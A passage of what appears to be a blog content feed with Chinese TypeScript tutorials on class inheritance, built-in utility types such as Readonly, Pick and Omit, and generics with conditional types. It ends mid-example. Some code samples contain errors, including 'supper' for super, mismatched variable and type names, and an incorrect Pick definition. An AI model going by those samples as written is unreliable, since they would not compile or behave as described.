class_">Person</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span>, friend?: Person</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">friend</span> = friend</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Person</span> &#123;</span><br><span class="line">  <span class="keyword">declare</span> friend?: <span class="title class_">User</span> <span class="comment">// <span class="doctag">TODO:</span> 注意这里：需要使用 declare</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">public</span> id: <span class="built_in">number</span>, name: <span class="built_in">string</span>, friend?: User</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(name, friend)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">login</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">sayHi</span>(<span class="params">target?: User</span>) &#123; <span class="comment">// <span class="doctag">TODO:</span> 注意：这叫做重写</span></span><br><span class="line">    <span class="keyword">if</span> (target === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      supper.<span class="title function_">sayHi</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;target.name&#125;</span>， 我是<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>好，面向对象又来事了，<br>想直接覆盖？不可以，只能用我提供的关键词 declare 来覆盖</p></blockquote><h4 id="最后再来思考一个问题"><a href="#最后再来思考一个问题" class="headerlink" title="最后再来思考一个问题"></a>最后再来思考一个问题</h4><p>这里的 friend 是 User 的还是 Person 的？</p><p>其实这个问题没必要纠结，之所以问出这个问题是因为你深受原型链的影响</p><p>原型链和 class 是两个不同的流派，没人会关心你这个东西是在哪里实现的，没人会关心你这个是独有属性，还是共有属性，只要给你实现出来就行了</p><blockquote><p>最后提醒一点，如果你在学习另一门语言，在你没学会之前，千万不要把这两个语言进行对比，这样只会搞的更混乱</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：泛型编程（下）</title>
      <link href="/Blog/2023/06/12/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/"/>
      <url>/Blog/2023/06/12/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>开始逐渐体操化</p></blockquote><p>先来看一些内置的 TS 工具</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123; <span class="attr">name</span>: <span class="built_in">string</span>; <span class="attr">age</span>: <span class="built_in">number</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">X1</span> = <span class="title class_">Readonly</span>&lt;<span class="title class_">Person</span>&gt;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">X2</span> = <span class="title class_">Partial</span>&lt;<span class="title class_">Person</span>&gt;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">X3</span> = <span class="title class_">Required</span>&lt;<span class="title class_">Person</span>&gt;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">X4</span> = <span class="title class_">Record</span>&lt;<span class="built_in">string</span>, <span class="built_in">number</span>&gt;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">X5</span> = <span class="title class_">Exclude</span>&lt;<span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span>, <span class="number">1</span> | <span class="number">2</span>&gt; <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">X6</span> = <span class="title class_">Extract</span>&lt;<span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span>, <span class="number">2</span> | <span class="number">4</span>&gt; <span class="comment">// 2</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">X7</span> = <span class="title class_">Omit</span>&lt;<span class="title class_">Person</span>, <span class="string">&#x27;name&#x27;</span> | <span class="string">&#x27;age&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="Readonly"><a href="#Readonly" class="headerlink" title="Readonly"></a>Readonly</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Readonly</span>&lt;T&gt; = &#123;</span><br><span class="line">  <span class="keyword">readonly</span> [K <span class="keyword">in</span> keyof T]: T[K]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>关键词 <code>in</code>，而不是用 <code>:</code>，上之前的文章种也提到过，in 多用于泛型</p></blockquote><p><img src="/Blog/2023/06/12/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/img.png"></p><h2 id="Partial"><a href="#Partial" class="headerlink" title="Partial"></a>Partial</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Partial</span>&lt;T&gt; = &#123;</span><br><span class="line">  [K <span class="keyword">in</span> keyof T]?: T[K]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Required"><a href="#Required" class="headerlink" title="Required"></a>Required</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Required</span>&lt;T&gt; = &#123;</span><br><span class="line">  [K <span class="keyword">in</span> keyof T]-?: T[K]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Record</span>&lt;K <span class="keyword">extends</span> <span class="built_in">string</span> | <span class="built_in">number</span> | <span class="built_in">symbol</span>, V&gt; = &#123;</span><br><span class="line">  [key <span class="keyword">in</span> K]: V</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exclude"><a href="#Exclude" class="headerlink" title="Exclude"></a>Exclude</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Exclude</span>&lt;T, K&gt; = T <span class="keyword">extends</span> K ? <span class="built_in">never</span> : T</span><br></pre></td></tr></table></figure><h2 id="Extract"><a href="#Extract" class="headerlink" title="Extract"></a>Extract</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Extract</span>&lt;T, K&gt; = T <span class="keyword">extends</span> K ? <span class="attr">T</span>: <span class="built_in">never</span></span><br></pre></td></tr></table></figure><h2 id="Omit"><a href="#Omit" class="headerlink" title="Omit"></a>Omit</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Omit</span>&lt;T, K&gt; = &#123;</span><br><span class="line">  [<span class="variable constant_">K2</span> <span class="keyword">in</span> keyof T <span class="keyword">as</span> (<span class="variable constant_">K2</span> <span class="keyword">extends</span> K ? <span class="built_in">never</span> : <span class="variable constant_">K2</span>)]: T[<span class="variable constant_">K2</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pick"><a href="#Pick" class="headerlink" title="Pick"></a>Pick</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Pick</span>&lt;T, K <span class="keyword">extends</span> keyof T&gt; = &#123;</span><br><span class="line">  [<span class="variable constant_">K2</span> <span class="keyword">in</span> keyof K]: T[<span class="variable constant_">K2</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候在来实现 Omit 更加简单</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Omit</span>&lt;T, K <span class="keyword">extends</span> keyof T&gt; = <span class="title class_">Pick</span>&lt;T, <span class="title class_">Exclude</span>&lt;keyof T, K&gt;&gt;</span><br></pre></td></tr></table></figure><h2 id="Mutable"><a href="#Mutable" class="headerlink" title="Mutable"></a>Mutable</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Mutable</span>&lt;T&gt; = &#123;</span><br><span class="line">  -<span class="keyword">readonly</span> [K <span class="keyword">in</span> keyof T]: T[K]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>理论上 TS 可以完成所有 JS 的功能</p><h2 id="超牛的项目"><a href="#超牛的项目" class="headerlink" title="超牛的项目"></a>超牛的项目</h2><h3 id="象棋"><a href="#象棋" class="headerlink" title="象棋"></a>象棋</h3><p><a href="https://github.com/chinese-chess-everywhere/type-chess">https://github.com/chinese-chess-everywhere/type-chess</a></p><p><img src="/Blog/2023/06/12/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/index/img_1.png"></p><h3 id="lisp-解释器"><a href="#lisp-解释器" class="headerlink" title="lisp 解释器"></a>lisp 解释器</h3><p>型体操天花板</p><p><a href="https://zhuanlan.zhihu.com/p/427309936">https://zhuanlan.zhihu.com/p/427309936</a></p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：泛型编程（上）</title>
      <link href="/Blog/2023/06/12/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/"/>
      <url>/Blog/2023/06/12/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>什么是泛型？<br>泛，指多<br>简单来说就是多种类型</p></blockquote><p>只要你能看懂 JS 的函数，那么你就能看懂 TS 的泛型</p><p>JS:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = (<span class="params">a, b</span>) =&gt; a + b</span><br><span class="line"><span class="keyword">const</span> result = <span class="title function_">fn</span>(<span class="number">1</span>,<span class="number">2</span>) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>TS:</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Fn</span>&lt;A, B&gt; = A | B</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">Fn</span>&lt;<span class="built_in">string</span>, <span class="built_in">number</span>&gt; <span class="comment">// string | number</span></span><br></pre></td></tr></table></figure><p>很像把，格式上看起来一模一样，非常简单</p><h2 id="思考：函数的本质是什么？"><a href="#思考：函数的本质是什么？" class="headerlink" title="思考：函数的本质是什么？"></a>思考：函数的本质是什么？</h2><p>不知道大家平时在写函数的时候，有没有想过这个问题？</p><ul><li>复用代码？那我声明就了一次，也没复用啊</li><li>抽离逻辑？为了代码更好看？</li><li>输入输出？这些目的是什么？不用函数我也能输入输出</li></ul><blockquote><p>个人认为：函数的本质是退后执行的、部分待定的代码</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>当这部分代码被解析的时候， console 就已经执行了，那我们想晚一点执行呢？用函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">fn</span>(), <span class="number">2500</span>)</span><br></pre></td></tr></table></figure><p>所以函数的本质之一就是：在我们这种面相过程的编程里面，把执行时机往后推迟</p><p>再继续看，还是这段代码，这里的 fn 函数体非常死板，只能打印出 1，于是我们改造：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">fn</span> = (<span class="params">x</span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="title function_">fn</span>(<span class="number">222</span>)</span><br><span class="line"><span class="title function_">fn</span>(<span class="number">333</span>)</span><br></pre></td></tr></table></figure><p>所以函数的第二个特点就是部分待定的代码，其实还是往后推迟，这里的 console 我不想立马确定，我希望能想什么时候执行就什么时候执行，想 log 几就 log 几</p><h2 id="举一反三：泛型的本质"><a href="#举一反三：泛型的本质" class="headerlink" title="举一反三：泛型的本质"></a>举一反三：泛型的本质</h2><p>泛型的本质是退后执行的、部分待定的<strong>类型</strong></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">echo</span>(<span class="params">n: <span class="built_in">number</span> | <span class="built_in">string</span> | <span class="built_in">boolean</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上我们希望这个函数的类型是传入什么类型就返回什么类型</p><ul><li>echo(n: number) &#x3D;&gt; number</li><li>echo(n: string) &#x3D;&gt; string</li><li>echo(n: boolean) &#x3D;&gt; boolean</li></ul><p>很遗憾，如果不用泛型做不到，即使你函数里面加了判断</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">echo</span>(<span class="params">n: <span class="built_in">number</span> | <span class="built_in">string</span> | <span class="built_in">boolean</span></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> n === <span class="string">&#x27;number&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> a === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2023/06/12/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/index/img.png"></p><p>依然存在错乱的情况</p><blockquote><p>没有泛型，有些奇怪的需求就无法满足<br>没有泛型的类型系统，就如同 JS 没有函数</p></blockquote><h2 id="泛型-简单难度"><a href="#泛型-简单难度" class="headerlink" title="泛型-简单难度"></a>泛型-简单难度</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Union</span>&lt;A, B&gt; = A | B</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Intersect</span>&lt;A, B&gt; = A &amp; B</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">List</span>&lt;T&gt; = &#123; <span class="comment">// 就像函数一样</span></span><br><span class="line">  [<span class="attr">key</span>: <span class="built_in">string</span>]: T</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123; <span class="attr">name</span>: <span class="built_in">string</span>; <span class="attr">age</span>: <span class="built_in">number</span>; &#125;</span><br><span class="line"><span class="title class_">List</span>&lt;<span class="title class_">Person</span>&gt; <span class="comment">// 能匹配下面这些数据 </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="title class_">Person</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="title class_">Person</span>,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h3><p>既然函数可以有默认值，泛型能有么？当然有</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">List</span>&lt;T = <span class="built_in">string</span>&gt; = &#123;</span><br><span class="line">  [<span class="attr">key</span>: <span class="built_in">string</span>]: T</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型-中等难度"><a href="#泛型-中等难度" class="headerlink" title="泛型-中等难度"></a>泛型-中等难度</h2><p>来看一道题目</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123; <span class="attr">name</span>: <span class="built_in">string</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LikeString</span>&lt;T&gt; = ??? <span class="comment">// 如果这个 T 是 string，则返回 true，否则 false</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LikeNumber</span>&lt;T&gt; = ??? <span class="comment">//如果这个 T 是 number，则返回 true，否则 false </span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LikePerson</span>&lt;T&gt; = ??? <span class="comment">// 如果这个 T 是 Person，则返回 true，否则 false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">R1</span> = <span class="title class_">LikeString</span>&lt;<span class="string">&#x27;hi&#x27;</span>&gt; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">R2</span> = <span class="title class_">LikeString</span>&lt;<span class="literal">true</span>&gt; <span class="comment">// false</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">S1</span> = <span class="title class_">LikeNumber</span>&lt;<span class="number">666</span>&gt; <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">S2</span> = <span class="title class_">LikeNumber</span>&lt;<span class="literal">false</span>&gt; <span class="comment">// 2</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">T1</span> = <span class="title class_">LikePerson</span>&lt;&#123; <span class="attr">name</span>: <span class="string">&#x27;hi&#x27;</span>, <span class="attr">xxx</span>: <span class="number">1</span> &#125;&gt; <span class="comment">// yes</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">T2</span> = <span class="title class_">LikePerson</span>&lt;&#123; <span class="attr">xxx</span>: <span class="number">1</span> &#125;&gt; <span class="comment">// no</span></span><br></pre></td></tr></table></figure><p>我们先想一下如果在 JS 中怎么实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">likeString</span> = a =&gt; <span class="keyword">typeof</span> a === <span class="string">&#x27;string&#x27;</span> ? <span class="literal">true</span> : <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>那么在 TS 中怎么实现呢？</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">LikeString</span>&lt;T&gt; = T <span class="keyword">extends</span> <span class="built_in">string</span> ? <span class="literal">true</span> : <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>疑惑点来了，为何 TS 中的判断要用 extends，为什么不能像 JS 那样使用 &#x3D;&#x3D;&#x3D;，多有语义化</p><p>其实这跟类型兼容、父类型、子类型有关系，在类型中很多时候我们做不到完全一致，因为集合与集合之间相等的时候是很少的，大多时候是从属关系，所以我们把这里的 extends 我更建议读作<strong>包含于</strong></p><p>剩下的实现就很简单了：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">LikeNumber</span>&lt;T&gt; = T <span class="keyword">extends</span> <span class="built_in">number</span> ? <span class="number">1</span> : <span class="number">2</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LikePerson</span>&lt;T&gt; = T <span class="keyword">extends</span> <span class="title class_">Person</span> ? <span class="string">&#x27;yes&#x27;</span> : <span class="string">&#x27;no&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="其中会有这几条规则"><a href="#其中会有这几条规则" class="headerlink" title="其中会有这几条规则"></a>其中会有这几条规则</h3><ol><li>若 T 为 <strong>never</strong>，则表达式的值为 <strong>never</strong></li><li>若 T 为联合类型，则<strong>分开计算</strong></li></ol><p>第一条规则：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="variable constant_">R1</span> = <span class="title class_">LikeString</span>&lt;<span class="built_in">never</span>&gt; <span class="comment">// never</span></span><br></pre></td></tr></table></figure><p>违背常理的事情又发生了，三元表达式竟然多计算出了一种结果！竟然返回了 never！</p><p>第二条规则：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ToArray</span>&lt;T&gt; = T <span class="keyword">extends</span> <span class="built_in">unknown</span> ? T[] : <span class="built_in">never</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = toArray&lt;<span class="built_in">string</span> | <span class="built_in">number</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="思考：此时-Result-的类型是什么"><a href="#思考：此时-Result-的类型是什么" class="headerlink" title="思考：此时 Result 的类型是什么"></a>思考：此时 Result 的类型是什么</h5><ol><li>Result 为 <strong>(string | number)[]</strong></li><li>Result 为 <strong>string[] | number[]</strong></li></ol><p>答案是 2，为 string[] | number[]，即为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = toArray&lt;<span class="built_in">string</span> | <span class="built_in">number</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="built_in">string</span> <span class="keyword">extends</span> <span class="built_in">unknown</span> ? <span class="built_in">string</span>[] : <span class="built_in">never</span></span><br><span class="line">               |</span><br><span class="line">              <span class="built_in">number</span> <span class="keyword">extends</span> <span class="built_in">unknown</span> ? <span class="built_in">number</span>[] : <span class="built_in">never</span></span><br></pre></td></tr></table></figure><p>为什么 TS 会这么推导呢？一开始我也很不理解，直至后来我用函数来理解</p><p>伪代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">a: T</span>): <span class="title class_">ToArray</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">type</span> a === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>[] </span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> a === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">number</span>[]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上我们经常会写出这样的函数，根据 a 的类型来判断返回值的类型，所以 TS 的预判是正确的</p><p>由此可推，上面返回的 never 也是合理的：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">a: T</span>): <span class="title class_">ToArray</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">type</span> a === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>[] </span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> a === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">number</span>[]</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">never</span> <span class="comment">// <span class="doctag">TODO:</span> 注意看这里，你传了一个 never 进来，自然而然就是返回 never</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意上述两条规则只对泛型有效（上面的代码也一直在用函数的思路来举例）</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> X = <span class="built_in">never</span> <span class="keyword">extends</span> <span class="built_in">unknown</span> ? <span class="number">1</span> : <span class="number">2</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h3 id="在加大一点难度"><a href="#在加大一点难度" class="headerlink" title="在加大一点难度"></a>在加大一点难度</h3><h4 id="获取对象的-key"><a href="#获取对象的-key" class="headerlink" title="获取对象的 key"></a>获取对象的 key</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123; <span class="attr">name</span>: <span class="built_in">string</span>; <span class="attr">age</span>: <span class="built_in">number</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">GetKeys</span>&lt;T&gt; = keyof T</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">GetKeys</span>&lt;<span class="title class_">Person</span>&gt; <span class="comment">// name | age</span></span><br></pre></td></tr></table></figure><h4 id="判断两个类型是否相等"><a href="#判断两个类型是否相等" class="headerlink" title="判断两个类型是否相等"></a>判断两个类型是否相等</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Eq</span>&lt;A, B&gt; = A <span class="keyword">extends</span> B ? B <span class="keyword">extends</span> A 